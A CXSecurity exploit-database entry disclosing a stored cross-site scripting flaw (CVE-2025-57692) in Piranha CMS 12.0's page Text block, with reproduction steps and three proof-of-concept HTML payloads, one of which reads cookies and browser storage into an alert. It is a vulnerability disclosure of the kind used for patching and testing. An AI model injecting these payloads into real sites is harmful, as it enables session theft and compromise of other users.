---
title: Piranha CMS 12.0 - Stored Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2026020006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-05
fetch_date: 2026-02-06T04:08:35.663997
---

# Piranha CMS 12.0 - Stored Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Piranha CMS 12.0 - Stored Cross Site Scripting**  **2026.02.05**  Credit:  **[Chidubem Chukwu](https://cxsecurity.com/author/Chidubem%2BChukwu/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-57692](https://cxsecurity.com/cveshow/CVE-2025-57692/ "Click to see CVE-2025-57692")**  CWE: **N/A** | |

# Exploit Title: Piranha CMS 12.0 - Stored Cross Site Scripting
# Date: 2025-09-26
# Exploit Author: Chidubem Chukwu (Terminal Venom)
# LinkedIn : https://www.linkedin.com/in/chidubem-chukwu-20bb202a9?
# Vendor Homepage: https://piranhacms.org
# Software Link: https://github.com/PiranhaCMS/piranha.core/releases/tag/v12.0
# Version: 12.0
# Category: Web Application
# Tested on: Ubuntu 22.04, Piranha CMS v12.0 (local), Chrome
# CVE: CVE-2025-57692
# Privilege Level: authenticated user
# Patched Version: Not available
# Exploit link: https://github.com/Saconyfx/security-advisories/blob/main/CVE-2025-57692/advisory.md
## Reproduction Steps ##
PiranhaCMS 12.0 allows stored XSS in the Text content block of Standard and Standard Archive Pages via /manager/pages, enabling execution of arbitrary JavaScript in another user s browser.
Reproduction steps
1. Log in to the Piranha admin panel at https://<host>/manager/login.
2. Navigate to Pages.
3. Click Add Page and choose Standard Page or Standard Archive.
4. Enter a page title (e.g., XSS-Test).
5. Click the [ + ] button and select Text under Content to add a Text block.
6. In the Text block input area, paste one of the payloads below (paste directly into the editor and save). The payload will execute immediately when pasted/saved and will also execute for anyone who later accesses or previews the page.
Payload A
<img src="x" onerror="
alert(
'Cookies: ' + document.cookie + '\n' +
'LocalStorage: ' + JSON.stringify(localStorage) + '\n' +
'SessionStorage: ' + JSON.stringify(sessionStorage) + '\n' +
'URL: ' + window.location.href + '\n' +
'User Agent: ' + navigator.userAgent + '\n' +
'Time: ' + new Date().toLocaleString()
)
" />
Payload B — iframe base64
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
Payload C — details toggle (on-toggle alert)
<details open ontoggle=alert('XSS')>Click</details>
7. Click Save. The payload executes immediately upon save (and will execute again when the page is previewed or accessed by others).
8. Anyone who accesses the page (or pastes the payload) will trigger the XSS.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top